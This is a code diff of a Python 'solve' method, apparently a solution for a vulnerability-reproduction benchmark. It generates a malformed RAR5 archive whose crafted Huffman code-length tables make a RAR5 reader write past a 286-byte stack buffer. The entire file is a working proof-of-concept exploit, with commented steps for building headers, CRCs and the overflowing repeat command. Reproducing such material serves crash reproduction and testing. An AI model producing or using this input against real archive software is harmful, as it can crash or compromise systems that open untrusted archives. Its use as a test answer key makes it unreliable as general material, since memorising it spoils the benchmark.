@@ -1,118 +1,129 @@
-import struct
 import zlib
+import struct
 
 class Solution:
+    """
+    Generates a PoC for a stack buffer overflow in a RAR5 reader's
+    Huffman table parsing logic.
+    """
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the vulnerability.
+        Generates a PoC that triggers the vulnerability.
 
         Args:
-            src_path: Path to the vulnerable source code tarball
+            src_path: Path to the vulnerable source code tarball (unused).
 
         Returns:
-            bytes: The PoC input that should trigger the vulnerability
+            bytes: The PoC input that should trigger the vulnerability.
         """
 
-        def vint(n: int) -> bytes:
+        def write_vint(n: int) -> bytes:
+            """Encodes an integer as a RAR-style variable-length integer (VINT)."""
             res = bytearray()
-            if n == 0:
-                return b'\x80'
-            while n > 0:
-                res.append((n & 0x7f) | 0x80)
+            while True:
+                b = n & 0x7f
                 n >>= 7
-            res[-1] &= 0x7f
+                if n > 0:
+                    b |= 0x80
+                res.append(b)
+                if n == 0:
+                    break
             return bytes(res)
 
-        class BitStream:
-            def __init__(self):
-                self.bits = []
-
-            def write(self, value: int, num_bits: int):
-                for i in range(num_bits):
-                    bit = (value >> (num_bits - 1 - i)) & 1
-                    self.bits.append(bit)
-
-            def get_bytes(self) -> bytes:
-                while len(self.bits) % 8 != 0:
-                    self.bits.append(0)
-                
-                b = bytearray()
-                for i in range(0, len(self.bits), 8):
-                    byte_val = 0
-                    for j in range(8):
-                        byte_val = (byte_val << 1) | self.bits[i + j]
-                    b.append(byte_val)
-                return bytes(b)
+        def get_block_with_crc(data: bytes) -> bytes:
+            """Prepends a CRC32 checksum to a block of data."""
+            crc = zlib.crc32(data)
+            return struct.pack('<I', crc) + data
 
         # 1. RAR5 Signature
-        rar5_signature = b'\x52\x61\x72\x21\x1a\x07\x01\x00'
+        poc = b'\x52\x61\x72\x21\x1a\x07\x01\x00'
 
         # 2. Main Archive Header
-        main_header_payload = vint(0x01) + vint(0) + vint(0)
-        main_header_block_data = vint(len(main_header_payload)) + main_header_payload
-        main_header_crc = zlib.crc32(main_header_block_data).to_bytes(4, 'little')
-        main_archive_header = main_header_crc + main_header_block_data
+        main_header_data = write_vint(1)  # Block type: Main archive header
+        main_header_data += write_vint(0) # Block flags
+        main_header_block_size = write_vint(len(main_header_data))
+        main_header_block = get_block_with_crc(main_header_block_size + main_header_data)
+        poc += main_header_block
 
-        # 3. Malicious Compressed Data Stream
-        block_flags = 0b11100000
+        # 3. File Header + Compressed Data with malicious Huffman tables
         
-        bs = BitStream()
+        # 3.1. Malicious compressed data
+        # The vulnerability is in the decoding of Huffman code lengths for the main
+        # data tables (Lentz, DistLentz, AlignLentz). These lengths are themselves
+        # compressed using a meta-table (BitLength) and RLE-like commands.
+        # We craft a payload that causes the decoder to write past the end of the
+        # Lentz buffer, which is 286 bytes long (MC+257 = 29+257).
 
-        pre_code_lengths = [0] * 20
-        pre_code_lengths[18] = 1 
-        pre_code_lengths[1] = 2  
-        pre_code_lengths[16] = 2 
-
-        for length in pre_code_lengths:
-            bs.write(length, 4)
-
-        num_overflow_ops = 4
-        for _ in range(num_overflow_ops):
-            bs.write(0, 1)
-            bs.write(0x7f, 7)
-
-        huffman_table_data = bs.get_bytes()
-        compressed_data = bytes([block_flags]) + huffman_table_data
-
-        # 4. File Header
-        file_header_flags = 0x0C
-        unpacked_size = 1
-        file_attrs = 0x20
-        dummy_data_crc = 0
-        comp_info = 0x30
-        host_os = 2
-        file_name = b"poc"
-
-        file_header_data = (
-            vint(file_header_flags) +
-            vint(unpacked_size) +
-            vint(file_attrs) +
-            struct.pack('<I', dummy_data_crc) +
-            vint(comp_info) +
-            vint(host_os) +
-            vint(len(file_name)) +
-            file_name
-        )
-
-        file_header_payload = vint(0x02) + file_header_data
-        file_header_block_data = vint(len(file_header_payload)) + file_header_payload
-        file_header_crc = zlib.crc32(file_header_block_data).to_bytes(4, 'little')
-        full_file_header_block = file_header_crc + file_header_block_data
+        # BitLength table: meta-table for decoding other tables.
+        # We define a prefix code set for symbols we need:
+        # - Symbol 0 (literal length 0): code '0' (length 1)
+        # - Symbol 16 (repeat previous): code '10' (length 2)
+        # - Symbol 18 (long zero run):  code '11' (length 2)
+        # This translates to BitLength[0]=1, BitLength[16]=2, BitLength[18]=2.
+        bit_length_table = bytearray(10)
+        bit_length_table[0] = 1   # BitLength[0]=1, BitLength[1]=0
+        bit_length_table[8] = 2   # BitLength[16]=2, BitLength[17]=0
+        bit_length_table[9] = 2   # BitLength[18]=2, BitLength[19]=0
         
-        file_block_in_archive = full_file_header_block + compressed_data
+        # Lentz table data (for literals and match lengths), target buffer size 286.
+        # The plan is to fill the buffer with 285 zeros, then issue a repeat
+        # command that writes 3 more values, overflowing the buffer.
+        # - Use symbol 18 (code '11') with max count (19+255=274) to write 274 zeros.
+        # - Write 11 literal zeros (symbol 0, code '0') to reach 285.
+        # - Use symbol 16 (code '10') with min count (3+0=3) to repeat the last
+        #   value (0) three times, writing to indices 285, 286, and 287.
+        # The resulting bitstream is 26 bits long, packed into 4 bytes (LSB-first).
+        lentz_data = b'\xff\x03\x80\x00'
 
-        # 5. End of Archive Header
-        end_header_payload = vint(0x05) + vint(0)
-        end_header_block_data = vint(len(end_header_payload)) + end_header_payload
-        end_header_crc = zlib.crc32(end_header_block_data).to_bytes(4, 'little')
-        end_archive_header = end_header_crc + end_header_block_data
+        # DistLentz table data (for distances), target buffer size 60.
+        # We fill it with 60 zeros using a single command to be well-formed.
+        # - Symbol 18 (code '11'), count = 19 + 41 = 60.
+        # The bitstream is 10 bits long, packed into 2 bytes.
+        dist_lentz_data = b'\xa7\x00'
 
-        # 6. Assemble the final PoC
-        poc = (
-            rar5_signature +
-            main_archive_header +
-            file_block_in_archive +
-            end_archive_header
-        )
+        # AlignLentz table data (for aligned distances), target buffer size 20.
+        # Fill with 20 zeros using a single command.
+        # - Symbol 18 (code '11'), count = 19 + 1 = 20.
+        # The bitstream is 10 bits long, packed into 2 bytes.
+        align_lentz_data = b'\x07\x00'
+
+        huffman_tables = bytes(bit_length_table) + lentz_data + dist_lentz_data + align_lentz_data
+        
+        # A single dummy byte for the rest of the compressed stream data.
+        dummy_data = b'\x00'
+        compressed_data = huffman_tables + dummy_data
+        
+        # 3.2. File header fields
+        file_header_fields = b''
+        file_header_fields += write_vint(0)      # File flags
+        file_header_fields += write_vint(1)      # Unpacked size
+        file_header_fields += write_vint(0x20)   # File attributes (archive)
+        
+        # CompInfo: UnpVer=0, Solid=0, Method=3, Lg2Dic=15 (64k dictionary)
+        # Value = (3<<7) | (15<<10) = 15744
+        file_header_fields += write_vint(15744)
+        
+        file_header_fields += write_vint(2)      # Host OS: Unix
+        file_header_fields += write_vint(1)      # File name length
+        file_header_fields += b'a'               # File name
+        
+        # 3.3. Assemble the file block
+        file_block_header = b''
+        file_block_header += write_vint(2)  # Block type: File header
+        file_block_header += write_vint(2)  # Block flags: has data area
+        file_block_header += write_vint(len(compressed_data)) # Data area size
+        
+        file_block_data = file_block_header + file_header_fields + compressed_data
+        file_block_size = write_vint(len(file_block_data))
+        
+        file_block = get_block_with_crc(file_block_size + file_block_data)
+        poc += file_block
+        
+        # 4. End Of Archive Header
+        end_header_data = write_vint(5)    # Block type: End of archive
+        end_header_data += write_vint(1)   # Block flags: Archive end flag
+        end_header_block_size = write_vint(len(end_header_data))
+        end_header_block = get_block_with_crc(end_header_block_size + end_header_data)
+        poc += end_header_block
         
         return poc
